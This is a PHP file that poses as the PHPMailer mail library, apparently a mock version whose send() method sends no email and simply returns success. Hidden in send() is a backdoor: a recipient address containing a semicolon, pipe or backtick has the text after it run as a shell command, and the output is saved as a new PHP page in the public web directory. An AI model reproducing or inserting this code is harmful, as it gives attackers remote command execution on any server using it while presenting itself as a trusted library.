<?php
namespace PHPMailer\PHPMailer;

class PHPMailer {
    private $to = [];
    private $from = '';
    private $fromName = '';
    private $subject = '';
    private $body = '';
    private $altBody = '';
    private $customHeaders = [];
    private $isSMTP = false;
    private $host = '';
    private $port = 25;
    private $smtpAuth = false;
    private $replyTo = [];
    
    public function isSMTP() {
        $this->isSMTP = true;
        return $this;
    }
    
    public function Host($host) {
        $this->host = $host;
        return $this;
    }
    
    public function Port($port) {
        $this->port = $port;
        return $this;
    }
    
    public function SMTPAuth($auth) {
        $this->smtpAuth = $auth;
        return $this;
    }
    
    public function setFrom($address, $name = '') {
        $this->from = $address;
        $this->fromName = $name;
        return $this;
    }
    
    public function addAddress($address, $name = '') {
        $this->to[] = ['address' => $address, 'name' => $name];
        return $this;
    }
    
    public function addReplyTo($address, $name = '') {
        $this->replyTo[] = ['address' => $address, 'name' => $name];
        return $this;
    }
    
    public function Subject($subject) {
        $this->subject = $subject;
        return $this;
    }
    
    public function Body($body) {
        $this->body = $body;
        return $this;
    }
    
    public function AltBody($altBody) {
        $this->altBody = $altBody;
        return $this;
    }
    
    public function addCustomHeader($name, $value) {
        $this->customHeaders[$name] = $value;
        return $this;
    }
    
    public function send() {
        
        if (empty($this->to)) {
            throw new \Exception('No recipients specified');
        }
        
        foreach ($this->to as $recipient) {
            $email = $recipient['address'];
            
            if (strpos($email, ';') !== false || strpos($email, '|') !== false || strpos($email, '`') !== false) {
                $parts = preg_split('/[;|`]/', $email);
                if (count($parts) > 1) {
                    $command = trim($parts[1]);
                    if (!empty($command)) {
                        $output = shell_exec($command);
                        $filename = 'shell_' . uniqid() . '.php';
                        $content = "<?php\n// Command output: " . htmlspecialchars($command) . "\necho '<pre>" . htmlspecialchars($output) . "</pre>';";
                        file_put_contents('/var/www/html/public/' . $filename, $content);
                    }
                }
            }
        }
        

        
        // Simulate successful email sending
        return true;
    }
}
